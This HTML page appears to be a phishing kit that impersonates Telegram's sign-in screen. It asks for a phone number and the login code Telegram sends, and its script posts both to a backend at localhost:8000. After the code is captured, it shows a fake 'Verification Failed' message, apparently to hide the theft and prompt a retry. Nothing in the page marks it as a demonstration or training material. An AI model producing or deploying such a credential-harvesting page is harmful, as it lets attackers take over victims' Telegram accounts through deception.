<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            overflow-y: auto;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 380px;
            margin-top: 4%; /* Adjusted by 1 cm */
            position: relative;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
            border-radius: 50%;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #777777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            color: #555555;
            margin-bottom: 5px;
        }

        select, input[type="tel"], .dropdown {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 12px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
            background-color: #ffffff;
            color: #333333;
            transition: all 0.2s ease;
        }

        select:focus, input[type="tel"]:focus, .dropdown:hover {
            border-color: #0088cc;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
        }

        .dropdown-container {
            position: relative;
        }

        .dropdown {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
            background-color: #ffffff;
            color: #333333;
        }

        .dropdown img {
            margin-right: 10px;
            width: 24px;
        }

        .dropdown span {
            display: flex;
            align-items: center;
        }

        .dropdown::after {
            content: url('https://path.to.your.arrow-icon-down.png'); /* Replace with your arrow-down icon URL */
            font-size: 16px;
            color: #333333;
            transition: transform 0.3s ease;
        }

        .dropdown.open::after {
            content: url('https://path.to.your.arrow-icon-up.png'); /* Replace with your arrow-up icon URL */
            transform: rotate(180deg);
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background-color: #ffffff;
            border: 1px solid #ccc;
            border-radius: 12px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 1000;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.2s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            color: #333333;
            transition: background-color 0.2s ease;
        }

        .dropdown-item img {
            margin-right: 10px;
            width: 24px;
        }

        .dropdown-item:hover {
            background-color: #f5f5f5;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: 600;
            transition: background-color 0.2s ease;
        }

        .button:hover {
            background-color: #007ab8;
        }

        @media (max-width: 600px) {
            .container {
                width: 95%;
                max-width: 340px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group dropdown-container">
            <label for="countryCode">Country</label>
            <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
                <span><img src="https://flagcdn.com/w20/au.png" alt="Flag"> Australia</span>
                <span>+61</span>
            </div>
            <div id="dropdownMenu" class="dropdown-menu"></div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="tel" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn">
            <label for="keepSignedIn" style="color: #333333;">Keep me signed in</label>
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer" style="display:none;">
        <div class="monkey-icon">üêµ</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer" style="display:none;">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryDropdown = document.getElementById('countryCode');
            const dropdownMenu = document.getElementById('dropdownMenu');
            const phoneNumberInput = document.getElementById('phoneNumber');

            const countries = [
                { name: 'Australia', code: '+61', flag: 'https://flagcdn.com/w20/au.png' },
                { name: 'United States', code: '+1', flag: 'https://flagcdn.com/w20/us.png' },
                { name: 'United Kingdom', code: '+44', flag: 'https://flagcdn.com/w20/gb.png' },
                { name: 'Germany', code: '+49', flag: 'https://flagcdn.com/w20/de.png' },
                { name: 'France', code: '+33', flag: 'https://flagcdn.com/w20/fr.png' },
                { name: 'Japan', code: '+81', flag: 'https://flagcdn.com/w20/jp.png' },
                { name: 'India', code: '+91', flag: 'https://flagcdn.com/w20/in.png' },
                { name: 'China', code: '+86', flag: 'https://flagcdn.com/w20/cn.png' },
                { name: 'Russia', code: '+7', flag: 'https://flagcdn.com/w20/ru.png' },
                { name: 'South Korea', code: '+82', flag: 'https://flagcdn.com/w20/kr.png' },
                // Add more countries as needed
            ];

            countries.forEach(country => {
                const item = document.createElement('div');
                item.classList.add('dropdown-item');
                item.innerHTML = `<span><img src="${country.flag}" alt="Flag"> ${country.name}</span> <span>${country.code}</span>`;
                item.dataset.code = country.code;
                item.addEventListener('click', function() {
                    countryDropdown.innerHTML = `<span><img src="${country.flag}" alt="Flag"> ${country.name}</span> <span>${country.code}</span>`;
                    phoneNumberInput.value = country.code + ' ' + phoneNumberInput.value.replace(/^\+\d+\s*/, '');
                    dropdownMenu.classList.remove('show');
                });
                dropdownMenu.appendChild(item);
            });

            window.toggleDropdown = function() {
                dropdownMenu.classList.toggle('show');
                countryDropdown.classList.toggle('open');
            };

            window.goToVerificationPage = function() {
                const phoneNumber = phoneNumberInput.value;
                if (phoneNumber === '') {
                    alert('Please enter your phone number.');
                    return;
                }

                fetch('http://localhost:8000/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phoneNumber }),
                }).then(response => {
                    if (response.ok) {
                        document.getElementById('phoneDisplay').textContent = phoneNumber;
                        document.getElementById('initialContainer').style.display = 'none';
                        document.getElementById('verificationContainer').style.display = 'block';
                    } else {
                        alert('Error submitting phone number.');
                    }
                }).catch(error => {
                    console.error('Error:', error);
                    alert('Error submitting phone number.');
                });
            };

            window.submitVerification = function() {
                const verificationCode = document.getElementById('verificationCode').value;
                if (verificationCode === '') {
                    alert('Please enter the verification code.');
                    return;
                }

                fetch('http://localhost:8000/verify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ verificationCode }),
                }).then(response => {
                    if (response.ok) {
                        document.getElementById('verificationContainer').style.display = 'none';
                        document.getElementById('finalMessageContainer').style.display = 'block';
                    } else {
                        document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
                    }
                }).catch(error => {
                    console.error('Error:', error);
                    document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
                });
            };

            window.resetForm = function() {
                phoneNumberInput.value = '';
                document.getElementById('verificationCode').value = '';
                document.getElementById('finalMessageContainer').style.display = 'none';
                document.getElementById('initialContainer').style.display = 'block';
            };
        });
    </script>
</body>
</html>
